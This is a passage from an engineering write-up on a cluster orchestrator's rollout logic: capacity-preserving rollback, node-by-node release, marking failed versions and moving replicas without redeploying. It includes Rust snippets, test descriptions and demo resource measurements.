with quotas, permissions, namespace separation and incomplete evidence.

## A rollback must not cost capacity

Here's a three-replica app on one node, with the default `max_surge = 1` and `auto_rollback = true`. The rollout starts `web-g1-0` on the new version; it goes healthy; an old instance retires to make room. Then `web-g1-1` fails its health check. What should the node do?

What it did was tear down every replacement, healthy ones included, and stop. Only the case with nothing retired produced `RolledBack`; anything else was recorded as `Halted`. So the app ended on two replicas, the two old ones that hadn't retired yet. Now picture an app with a managed volume. It always rolls stop-first, because two processes must never write the same directory, so the only old instance retires *before* its replacement starts. A bad image then fails the replacement, the abort kills it, and the app runs nothing at all. That's auto-rollback turning a bad deploy into an outage.

The fix starts from the right invariant: an abort never ends below `min(healthy new + remaining old, replicas)`. When nothing has retired, killing the replacements is fine, and that's still what happens. When something has, `restore_previous_capacity` rolls *backwards*. It starts previous-spec instances for the ordinals no remaining old instance holds, and only retires a healthy replacement once one of them is healthy. It reuses `plan_rolling_step`, the same pure planner the forward rollout uses, with the healthy replacements in the "old" seat:

```rust
let step = crate::meat::deploy_types::plan_rolling_step(
    ordinals.len() as u32,          // the replicas the restoration must cover
    restored.healthy.len() as u32,  // previous-spec instances up and healthy
    0,
    to_retire.len() as u32,         // healthy replacements still serving
    rollout.config.max_surge,
    rollout.config.max_unavailable,
);
```

So the budget the operator set holds in both directions, and the volume app rolls back stop-first like it rolled forward. If the previous spec won't start either, the healthy replacements stay and the result is `Halted`, with the reason.

The node needs the previous spec to do that, and it didn't keep it: `StoreDeployedSpec` overwrote it. The op now answers the spec it replaced (`HashMap::insert` already returns the old value, as an `Option`), and a rolled-back node stores it back, so its reports and the next rollout see what really runs.

The abort's inputs grew to nine, so they travel as one struct:

```rust
#[derive(Debug, Clone, Copy)]
pub(super) struct AbortedRollout<'a> {
    pub(super) app_name: &'a str,
    pub(super) spec: &'a AppSpec,
    pub(super) previous: Option<&'a AppSpec>,
    pub(super) started: &'a Replacements,
    pub(super) remaining_old: &'a [InstanceId],
    // ...
}
```

`<'a>` is a *lifetime parameter*. Every field borrows from the caller's stack frame, and `'a` names how long those borrows last, so the compiler can check that no `AbortedRollout` outlives the vectors it points into. In C you'd pass the pointers and hope; in Go the garbage collector would keep them alive. And because every field is a reference or a number, the struct can derive `Copy`: passing it around copies a handful of pointers, never the data behind them.

## One node at a time

The second problem was bigger. Every node's placement reconciler polls the leader for its assignments, and when an app's spec changed every node got the new one on the same poll and rolled its share at once. `max_surge` and `max_unavailable` bounded each node's share, not the app. An app with one replica per node was therefore fully down on every redeploy, and a version that started fine but served garbage reached every node before anyone noticed.

We looked at three answers (decision D10 in #674). Full leader-coordinated rollouts, with the rollout's progress in Raft and one surge budget across the cluster, are what the whitepaper always described, and they're a lot of machinery. Documenting the per-node behaviour is honest and fixes nothing. The middle road is what shipped: the leader releases a spec change to one node at a time and waits for that node's share to be healthy before the next.

The interesting part is where the progress lives: nowhere new. Each node's reconciler already records the spec it last finished deploying (the `Applied` fingerprint in its checkpoint). It now tells the agent, the agent puts it in its state report, and the leader reads it from there. A new leader gets the same reports, so it carries on where the old one stopped, without a line of rollout state in Raft. The decision itself is a pure function in `src/cluster/rollout.rs`:

```rust
pub enum Release<'a> {
    Desired,
    Hold(&'a AppSpec),
}

pub fn plan_release<'a>(
    desired: &AppSpec,
    rollouts: Option<&'a AppRollouts>,
    shares: &BTreeMap<NodeId, NodeShare>,
) -> BTreeMap<NodeId, Release<'a>>
```

`Hold` borrows the last fully rolled-out spec straight out of the council's record, and the `'a` on the return type says so: the plan can't outlive the `AppRollouts` it borrowed from. The `BTreeMap` isn't an accident either. It iterates in key order, so "nodes in node-id order" falls out of the type rather than a sort someone might forget.

Versions are compared by `rollout_fingerprint`, a SHA-256 of the spec with `replicas` and `ordinals` set aside. The leader holds the whole app and each node runs its share under its own count and ordinals, so those two fields always differ between the two views of the same version. Setting them aside also means a scale change is never mistaken for a rollout.

A held node keeps whatever it runs. It starts the held spec only for a first placement, and follows a scale change only of the version it already runs. That matters after a failover: a new leader whose reports haven't arrived yet sees every node as unsettled and may hold a node that already finished. Holding means "don't touch", so the worst a stale view costs is time.

## Stop retrying a bad version

With `auto_rollback` on, a failed node rolled back locally, the reconciler saw a failed deploy, and retried the same spec with backoff, up to every five minutes, forever. Each retry made a new generation, a new failing container and a new history entry. Meanwhile the client had been told "deploy started".

Decision D11 picked `RolloutFailed` over reverting the desired spec. Reverting sounds tidier, but with GitOps on it fights: Lettuce would apply the bad spec again on its next sync. So the node reports the abort (the agent now sends a `RolloutAborted` event after the error that caused it, and the reconciler posts it to the leader's `/v1/rollouts/failed`), and the leader commits `RolloutFailed` with the fingerprint, the node and the reason. From then on the planner hands that fingerprint to nobody who isn't already running it. The state machine clears the mark when a *different* spec arrives and keeps it for the same one, so a GitOps re-sync doesn't restart the failure loop. `relish status` prints it, `relish wtf` raises a warning that says how to clear it, and the desired-apps API carries it.

The first version of that rule had a hole, and the end-to-end run for #870 fell into it (#929). The state machine decided "different" by comparing fingerprints, and a fingerprint sets `replicas` aside. That's right for the planner, which must not mistake a scale change for a new version. It's wrong for the mark. An operator who saw `RolloutFailed`, changed `replicas` and applied again got a commit, new instances, and the same old `RolloutFailed`. Nothing they could do short of changing the image moved it on. Now `apply_app_spec` compares the whole spec with the one it replaces:

```rust
let identical = self.state.apps.get(app_id) == Some(spec);
self.state.apps.insert(app_id.clone(), spec.clone());
if !identical && let Some(rollouts) = self.state.rollouts.get_mut(app_id) {
    rollouts.failed = None;
}
```

`AppSpec` derives `PartialEq`, so `==` compares every field, the way Go's `reflect.DeepEqual` would but checked at compile time: a type without `PartialEq` wouldn't compile here. `get` returns an `Option<&AppSpec>` and `spec` is already a `&AppSpec`, so `Some(spec)` builds the same type and the comparison needs no cloning. The `if !identical && let Some(..) = ..` is the let chain from Chapter 1, here mixing a plain boolean with a pattern. Any change now clears the mark, and with it gone the planner releases the spec node by node again. A scale change of a version that's still broken fails on the first node and is marked again, which is what "retry" should mean. An identical apply still keeps the mark, as D11-B decided, but it no longer passes in silence: after the commit, the leader's apply stream checks whether the app's current spec is still `RolloutFailed`, and if it is, `relish apply` prints a warning naming the node and the reason and saying the same spec isn't retried.

The leader also commits `RolloutReleased` once every node an app is placed on runs its current spec healthy. That gives the council the last ten distinct specs that rolled out everywhere, which is both what held nodes fall back on and where `relish rollback` now looks first, so a rollback still works after every node has restarted.

The two records then met in the 0.2.1 jobs soak (#1110). An upgrade walk restarts each node, and each restart gives up that node's replicas, so the leader moves them around. The version doesn't change, but a node's share does, and a node redeployed its share when that changed (the next section fixes that). Mid-walk, the VMs were full, node 1's redeploy of frontend failed and rolled back, and node 1 reported the failure. The state machine checked only that the report named the current spec, which it did, and marked the version `RolloutFailed`. That version had already rolled out on every node. The leader had no previous spec to hold the app on, because it *was* the previous spec, and the mark stayed until someone applied a different one. `relish wtf` warned about it for as long as the soak ran, while every replica kept serving.

So the state machine now refuses a failure report whose fingerprint matches the newest released spec. A node that can't redeploy a healthy version has hit a capacity or runtime problem, not a bad version: it logs the refusal, backs off and tries again, and the replica checks report any shortfall. A failure of a *new* version after a release is still marked, since the released spec is the old one.

### Moving a replica isn't a rollout

That refusal stopped the false mark. It didn't stop node 1 from tearing down a healthy frontend to start an identical one, which is where the trouble began (#1111).

Why did it redeploy at all? The placement reconciler hands a node its share of an app as the app's spec with `replicas` set to the share and `ordinals` naming the replicas (Chapter 2 tells how ordinals got there). The fingerprint the reconciler compares includes the ordinals, so a move is a new assignment. Then the agent asks whether it can take the change in place, and the only change it used to accept was a bigger count with every old ordinal kept, the #346 scale-up. Anything else, two ordinals swapped, one leaving while another arrives, went to `rolling_redeploy`, which starts `frontend-g1-0` beside `frontend-0` for every replica on the node. Same image, same everything, a new generation. On a node with room that's only churn. On a full node it can't even start, because a rolling replacement surges: it needs room for the new replica before the old one goes. Starting the one arriving ordinal would have fitted, since the departing one was about to free exactly that much.

So the agent now looks at what actually changed:

```rust
fn share_change(previous: &AppSpec, wanted: &AppSpec) -> Option<ShareChange> {
    let (Replicas::Fixed(_), Replicas::Fixed(_)) = (previous.replicas, wanted.replicas) else {
        return None;
    };
    let mut same_version = previous.clone();
    same_version.replicas = wanted.replicas;
    same_version.ordinals.clone_from(&wanted.ordinals);
    if same_version != *wanted {
        return None;
    }
    let before: BTreeSet<u32> = previous.replica_ordinals().into_iter().collect();
    let after: BTreeSet<u32> = wanted.replica_ordinals().into_iter().collect();
    Some(ShareChange {
        arriving: after.difference(&before).copied().collect(),
        departing: before.difference(&after).copied().collect(),
    })
}
```

The first half asks "is this the same version?" by copying the old spec, overwriting the two share fields with the new ones, and comparing the result with the whole new spec. If anything else differs, an image, an environment variable, a health check, it's a new version and it rolls. The second half is set arithmetic. `BTreeSet` is the standard library's ordered set, and `difference` returns an iterator over the elements of one set that aren't in the other, like Python's `after - before`. The iterator yields `&u32` references into the set, and `copied()` turns them into plain `u32` values so `collect()` can build an owned `Vec`. Using an ordered set also means `[2, 0]` and `[0, 2]` are the same share, whichever order the leader listed them in.

`share_change_in_place` then checks the node itself: one running instance per ordinal of the previous share, and none of them waiting on a restart. A node halfway through a failed rollout, or with a crash-looping replica, still rolls, because "start what's missing" only makes sense when what's there is healthy. If it all checks out, the agent retires the departing replicas through the same drain-and-stop path a rollout uses, and only then starts the arriving ones. Retiring first is deliberate. The leader has already given the departing ordinal to another node, so this node isn't its home any more, and stopping it first hands a full node back the room the new replica needs. The replicas that stay in the share are never touched.

What if it stops partway, say a replica left and then the arriving one was refused for capacity? The node no longer runs its previous share, so recording that would be a lie, and the retry would see too few instances and roll. It records the previous share minus the replicas that already left, and the retry starts only what's missing. A version change still takes the old road: `a_moved_share_with_a_new_version_still_rolls` moves a share and changes the image in the same deploy, and every replica comes back as a new generation.

The soak taught us one more thing. When a rollout did abort, the node told the leader `rolled back — old instances preserved`, which says what happened to the instances but not why. The real cause, "node capacity cannot admit cpu=100m mem=32Mi", was in the error event just before the abort, and the reconciler dropped it. Now `deploy_outcome` puts the first error in front of the abort's own reason, so the `RolloutFailed` mark and `relish wtf` say why a rollout failed as well as what it left behind.

### Tests

The agent tests drive the real deploy worker against a `MockGrill` with a state override that makes one named replacement fail its health wait: `auto_rollback_after_a_retirement_restores_old_capacity` (three replicas, scenario A above), `auto_rollback_of_a_stop_first_volume_app_restarts_the_old_instance` (scenario B) and `abort_keeps_healthy_new_instances_when_old_capacity_cannot_return`. The share-move tests sit beside them: `a_moved_replica_starts_the_arriving_ordinal_and_retires_the_departing_one` checks that the replica that stays is never stopped, `a_shrunk_share_retires_only_the_departing_replica` and `a_swapped_share_starts_the_new_ordinals_without_a_new_generation` cover the other shapes, and `a_replica_moves_onto_a_full_node_where_a_redeploy_would_not_fit` gives the node a budget its two replicas fill, the soak's situation. All four failed before the change. The unit tests in `src/bun/agent/scale_in_place.rs` pin `share_change` itself for a pure increase, a pure decrease, a swap, one out and one in, an empty share, a reordered share, a version change and a daemon set, and `a_rollout_abort_reason_keeps_the_first_error` in `src/cluster/orchestrate.rs` checks the cause reaches the leader. The planner tests in `src/cluster/rollout.rs` cover one-node-at-a-time release, waiting on an unhealthy share, resuming from reports, ungated first placements and scale changes, and a failed spec that nobody new receives. The state machine tests cover the `RolloutFailed` mark surviving an identical re-apply, clearing on a new spec and on a scale change (`scale_change_clears_rollout_failed`), being set again when the same version fails again, refusing a stale report, refusing a failure of the spec that already rolled out (`a_failure_of_the_released_spec_is_refused`) while still marking a new version's failure after a release, and the ten-target cap. Two tests in the portable suite (`tests/suite/rollout_failed.rs`) apply through the real API against a one-node council: an identical re-apply keeps the mark and prints the warning, and a scale change clears it without one. The cluster tests in `tests/placement.rs` (`make test-cluster`) run three real nodes: a one-replica-per-node app keeps two replicas serving through a redeploy, a bad version becomes `RolloutFailed` and stops retrying, a scale change starts a new rollout that fails and is marked again, and `relish rollback` works after every node restarts.

### Watching it on a laptop

Tests prove the rules; they don't let someone evaluating Reliaburger watch a bad version bounce off. `scripts/demo/rollout.sh` does. It applies `examples/phase-1/proc-rollout.toml` as v1, rolls it to v2, runs `relish rollback`, then applies a v3 whose testapp fails every health check, and checks each step against what the app really serves on its port (testapp's `/env/VERSION` route answers with the instance's `VERSION` variable). The last steps are the ones this section is about: v3 marked `RolloutFailed` with v1 still serving, a second identical apply that only warns, and a v2 that clears the mark.

The demo needs a cluster, because `RolloutFailed` is the council's mark, and the first draft started one the quick way: `bun --cluster` with plaintext transports and no `relish init`. Every step passed except the one that mattered. The node rolled v3 back, then logged `the leader refused the rollout failure of default/web: 403 Forbidden` and went back to retrying. The report to `/v1/rollouts/failed` carries the node's service token, and a cluster that never ran `relish init` has none to give it. So `scripts/demo/lib.sh` sets the node up the way the manual does: `relish init` writes the CA and keys, a few `sed` lines point the generated config at a temporary directory and loopback ports, and the first `relish token create` mints the demo's admin token. A demo that takes a shortcut the product doesn't support ends up demonstrating the shortcut.

`examples/phase-1/container-rollout.toml` is the container version, with `strategy = "blue-green"` on podinfo. The process version can't roll surge-first: two testapp instances can't both listen on one host port, so it sets `max_surge = 0` and `max_unavailable = 1` and the planner retires before it starts.

### What the demo costs

Reliaburger says it's light. A demo that rolls three versions and never shows what that cost the laptop asks the audience to take the claim on trust, so the demos measure themselves (#671). `scripts/demo/resources.py` runs in the background from the moment `demo_start` launches Bun to the moment `demo_stop` shuts it down, which is why it lives in `lib.sh`: the rollout and GitOps demos gained it without a line changing in either. Before each heading, `demo_step` prints the latest sample on one line, and the demo ends with a table:

```text
    resources: bun 109.5 MiB, 66.7 % CPU · 2 workloads 23.8 MiB, 1.0 % CPU

==> Roll back: the council remembers the last version that rolled out healthy
...
==> Resource use: 25 samples over 24 s on demo-node
                     average           peak
  bun CPU               70.4 %         94.6 %
  bun memory           109.7 MiB      117.3 MiB
  workload CPU           0.3 %          1.0 %
  workload memory       17.2 MiB       24.3 MiB
  CPU is a percentage of one core.
  network: not measured (a local node talks over loopback, which neither Linux nor macOS counts per process)
```

That's a debug build on a laptop running a dozen other builds, and the first run's numbers were the first surprise: Bun at two thirds of a core to roll one app. A debug build of anything Tokio-heavy is slow, which is why the manual tells you to point `BUN` at a release build before quoting a number. The measurement is the point. Before it, nobody could have told you what the demo cost at all.

The issue's first wish was a graph that moves with the asciinema recording. That turns out to be the hard version. The tour's recording trims idle time to two seconds and plays setup four times faster, so a chart drawn against the wall clock drifts away from the terminal it's meant to sit beside, and keeping the two in step would mean a custom player. The readout line gets the same effect for free: it's part of the terminal output, so it lands in the recording at exactly the moment it describes, whatever the player cuts. For a chart, `DEMO_RESOURCES_OUT=dir` keeps the samples as `resources.csv` and draws `cpu.svg` and `memory.svg` with the soak charts' code from `scripts/release/soak_charts.py`, the demo's steps marked along the time axis where the soak marks its faults. Reusing it took three small changes there: time steps of seconds for a run that lasts a minute, a `key` argument so the legend says "demo step" instead of "upgrade walk", and a `step` mark that draws as a tick.

Two details decide whether the numbers are honest. The first is what counts as a workload. The obvious answer, Bun's descendants, misses most of them: the process runtime runs each workload under an owner process that outlives Bun on purpose (so a Bun restart doesn't kill your app), and an owner that outlives its parent gets re-parented to `init` or `launchd`. The sampler finds them by their command lines, which name the node's data directory, and adds their descendants. The second is what isn't measured. A one-node demo talks to itself over loopback, and neither Linux nor macOS keeps per-process byte counts for that without eBPF or `nettop` parsing. Rather than print a system-wide loopback figure that includes the browser in the next window, the summary says network wasn't measured. The tour is different: its nodes are Lima VMs, so `scripts/demo/tour.sh` samples each guest through `limactl shell` every five seconds and reports Bun, the whole guest (Bun, its workloads and the operating system together) and the guest's network links. A VM's traffic is its own, so there it's worth counting.

The sampler is a Python script, like the soak's tooling, not a `relish` subcommand. It reads `/proc` on Linux and `ps` on macOS, and whatever it can't read it leaves blank instead of failing the demo: a demo that dies because `ps` printed a column differently would be measuring the wrong thing. `scripts/ci/test_demo_resources.py` covers the parsing (macOS's `1:02.50` and Linux's `00:01:02` for the same minute of CPU, a `/proc/PID/stat` whose command name has spaces and parentheses in it), the CPU arithmetic, a restarted Bun whose tick count went backwards, the CSV and the summary. `tests/demos.rs` checks every live run prints both the readout and the summary, so a sampler that silently stops sampling fails `make test-cluster`.

### What we learned

The bug in the abort wasn't in a tricky line. Each step was locally reasonable: tear down what you started, keep what you didn't touch. The mistake was not writing down the invariant the whole function had to keep, "never end below the capacity you started with", and testing for it. Once it was written down, the fix was mostly reuse.

